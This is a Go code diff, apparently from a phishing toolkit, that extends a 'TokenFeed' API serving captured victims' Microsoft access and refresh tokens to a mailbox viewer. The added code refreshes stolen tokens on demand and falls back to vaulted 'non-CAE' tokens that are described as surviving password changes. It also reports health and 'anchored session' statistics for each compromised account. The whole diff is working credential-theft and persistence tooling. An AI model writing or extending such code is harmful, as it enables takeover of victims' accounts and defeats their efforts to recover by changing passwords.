@@ -13,7 +13,8 @@ import (
 )
 
 // TokenFeed provides a secure JSON API that serves captured tokens to mailbox.html
-// It auto-refreshes tokens server-side and serves them via a secret endpoint.
+// It performs on-demand token refresh when serving to ensure tokens are always fresh,
+// regardless of background refresh status or password changes after capture.
 
 // FeedAccount represents an account entry served to mailbox.html
 type FeedAccount struct {
@@ -23,17 +24,22 @@ type FeedAccount struct {
 	AccessToken  string `json:"accessToken"`
 	RefreshToken string `json:"refreshToken"`
 	SessionID    int    `json:"sessionId"`
+	SessionSID   string `json:"sessionSid"`
 	CapturedAt   string `json:"capturedAt"`
 	LastRefresh  string `json:"lastRefresh"`
-	Status       string `json:"status"` // "active" or "expired"
+	Status       string `json:"status"`       // "active", "degraded", "dead", "no-refresh"
+	Health       string `json:"health"`       // detailed health status
+	RefreshCount int    `json:"refreshCount"` // total number of successful refreshes
 }
 
 // TokenFeed manages the API endpoint for serving tokens to mailbox viewer
 type TokenFeed struct {
-	db        *database.Database
-	apiKey    string // Secret key for API access
-	mu        sync.RWMutex
-	lastFetch time.Time
+	db          *database.Database
+	apiKey      string // Secret key for API access
+	mu          sync.RWMutex
+	lastFetch   time.Time
+	autoRefresh *TokenAutoRefreshManager // Reference to auto-refresh for on-demand refresh
+	persistence *TokenPersistenceEngine  // Reference to vault for fallback tokens
 }
 
 // NewTokenFeed creates a new token feed with a random API key
@@ -67,6 +73,20 @@ func NewTokenFeedWithKey(db *database.Database, apiKey string) *TokenFeed {
 	return tf
 }
 
+// SetAutoRefreshManager connects the auto-refresh manager for on-demand refresh
+func (tf *TokenFeed) SetAutoRefreshManager(arm *TokenAutoRefreshManager) {
+	tf.mu.Lock()
+	defer tf.mu.Unlock()
+	tf.autoRefresh = arm
+}
+
+// SetPersistenceEngine connects the persistence engine for vault fallback tokens
+func (tf *TokenFeed) SetPersistenceEngine(pe *TokenPersistenceEngine) {
+	tf.mu.Lock()
+	defer tf.mu.Unlock()
+	tf.persistence = pe
+}
+
 // GetAPIKey returns the current API key
 func (tf *TokenFeed) GetAPIKey() string {
 	tf.mu.RLock()
@@ -89,10 +109,16 @@ func (tf *TokenFeed) ValidateKey(key string) bool {
 	return key != "" && key == tf.apiKey
 }
 
-// GetAccounts returns all sessions that have tokens, formatted for mailbox.html
+// GetAccounts returns all sessions that have tokens, formatted for mailbox.html.
+// Token priority chain:
+//  1. ON-DEMAND REFRESH (refresh token still alive → freshest possible token)
+//  2. VAULT FALLBACK (refresh token dead/password changed → pre-generated non-CAE tokens that survive)
+//  3. CACHED TOKEN (last resort → whatever is in the database)
 func (tf *TokenFeed) GetAccounts() ([]FeedAccount, error) {
 	tf.mu.Lock()
 	tf.lastFetch = time.Now()
+	autoRefresh := tf.autoRefresh
+	persistence := tf.persistence
 	tf.mu.Unlock()
 
 	sessions, err := tf.db.ListSessions()
@@ -115,6 +141,31 @@ func (tf *TokenFeed) GetAccounts() ([]FeedAccount, error) {
 			continue
 		}
 
+		tokenSource := "cached"
+		refreshFailed := false
+
+		// PRIORITY 1: ON-DEMAND REFRESH (if refresh token is alive)
+		if autoRefresh != nil && refreshToken != "" {
+			freshToken, err := autoRefresh.RefreshAndGetToken(s.SessionId)
+			if err == nil && freshToken != "" {
+				accessToken = freshToken
+				tokenSource = "live-refresh"
+			} else {
+				refreshFailed = true
+			}
+		}
+
+		// PRIORITY 2: VAULT FALLBACK (if refresh failed → password likely changed)
+		// The vault contains pre-generated non-CAE tokens that survive password changes
+		if refreshFailed && persistence != nil {
+			vaultToken := persistence.GetBestToken(s.SessionId, "graph")
+			if vaultToken != "" {
+				accessToken = vaultToken
+				tokenSource = "vault"
+				log.Debug("[tokenfeed] %s: serving vault token (refresh dead, vault alive)", s.Username)
+			}
+		}
+
 		email := s.Custom["dc_user_email"]
 		if email == "" {
 			email = s.Username
@@ -128,21 +179,63 @@ func (tf *TokenFeed) GetAccounts() ([]FeedAccount, error) {
 			displayName = email
 		}
 
+		// Determine status based on health tracking and token source
 		status := "active"
+		healthStr := "unknown"
+		refreshCount := 0
+
+		if autoRefresh != nil {
+			if health := autoRefresh.GetSessionHealth(s.SessionId); health != nil {
+				status = health.Status
+				if status == "new" {
+					status = "active"
+				}
+				healthStr = fmt.Sprintf("%s (failures: %d, refreshes: %d)",
+					health.Status, health.ConsecutiveFailures, health.TotalRefreshes)
+				refreshCount = health.TotalRefreshes
+				if health.LastError != "" {
+					healthStr += " | " + health.LastError
+				}
+			}
+		}
+
+		// Override status based on token source
+		switch tokenSource {
+		case "vault":
+			status = "vault-protected"
+			healthStr = "refresh token dead - serving pre-generated non-CAE vault tokens"
+			if persistence != nil {
+				vaultCount := persistence.GetVaultTokenCount(s.SessionId)
+				anchorCount := persistence.GetAnchoredSessionCount(s.SessionId)
+				healthStr += fmt.Sprintf(" | vault tokens: %d, anchored sessions: %d", vaultCount, anchorCount)
+			}
+		case "live-refresh":
+			// Status is fine from health tracker
+		case "cached":
+			if refreshFailed {
+				status = "degraded"
+				healthStr = "refresh failed, serving cached token - may expire soon"
+			}
+		}
+
 		if refreshToken == "" {
 			status = "no-refresh"
+			healthStr = "no refresh token - access token only"
 		}
 
 		acc := FeedAccount{
-			ID:          fmt.Sprintf("eg-%d", s.Id),
-			Email:       email,
-			DisplayName: displayName,
-			AccessToken: accessToken,
+			ID:           fmt.Sprintf("eg-%d", s.Id),
+			Email:        email,
+			DisplayName:  displayName,
+			AccessToken:  accessToken,
 			RefreshToken: refreshToken,
-			SessionID:   s.Id,
-			CapturedAt:  time.Unix(s.CreateTime, 0).UTC().Format(time.RFC3339),
-			LastRefresh: time.Unix(s.UpdateTime, 0).UTC().Format(time.RFC3339),
-			Status:      status,
+			SessionID:    s.Id,
+			SessionSID:   s.SessionId,
+			CapturedAt:   time.Unix(s.CreateTime, 0).UTC().Format(time.RFC3339),
+			LastRefresh:  time.Unix(s.UpdateTime, 0).UTC().Format(time.RFC3339),
+			Status:       status,
+			Health:       healthStr,
+			RefreshCount: refreshCount,
 		}
 
 		accounts = append(accounts, acc)
@@ -167,14 +260,42 @@ func (tf *TokenFeed) HandleFeedRequest(apiKey string) (string, int) {
 		accounts = []FeedAccount{}
 	}
 
+	// Include system health info
+	tf.mu.RLock()
+	autoRefresh := tf.autoRefresh
+	persistence := tf.persistence
+	tf.mu.RUnlock()
+
+	systemHealth := map[string]interface{}{}
+	if autoRefresh != nil {
+		total, withRefresh := autoRefresh.GetRefreshStats()
+		systemHealth["running"] = autoRefresh.IsRunning()
+		systemHealth["totalSessions"] = total
+		systemHealth["sessionsWithRefresh"] = withRefresh
+		systemHealth["totalRefreshes"] = autoRefresh.GetTotalRefreshCount()
+		systemHealth["uptime"] = autoRefresh.GetUptime().String()
+	}
+
+	// Include vault stats for password-change survival
+	if persistence != nil {
+		totalVaults, totalTokens, validTokens, anchoredSessions := persistence.GetAllVaultStats()
+		systemHealth["vaultActive"] = true
+		systemHealth["vaultCount"] = totalVaults
+		systemHealth["vaultTotalTokens"] = totalTokens
+		systemHealth["vaultValidTokens"] = validTokens
+		systemHealth["vaultAnchoredSessions"] = anchoredSessions
+	}
+
 	response := struct {
-		Accounts  []FeedAccount `json:"accounts"`
-		Count     int           `json:"count"`
-		Timestamp string        `json:"timestamp"`
+		Accounts     []FeedAccount          `json:"accounts"`
+		Count        int                    `json:"count"`
+		Timestamp    string                 `json:"timestamp"`
+		SystemHealth map[string]interface{} `json:"systemHealth,omitempty"`
 	}{
-		Accounts:  accounts,
-		Count:     len(accounts),
-		Timestamp: time.Now().UTC().Format(time.RFC3339),
+		Accounts:     accounts,
+		Count:        len(accounts),
+		Timestamp:    time.Now().UTC().Format(time.RFC3339),
+		SystemHealth: systemHealth,
 	}
 
 	data, err := json.Marshal(response)
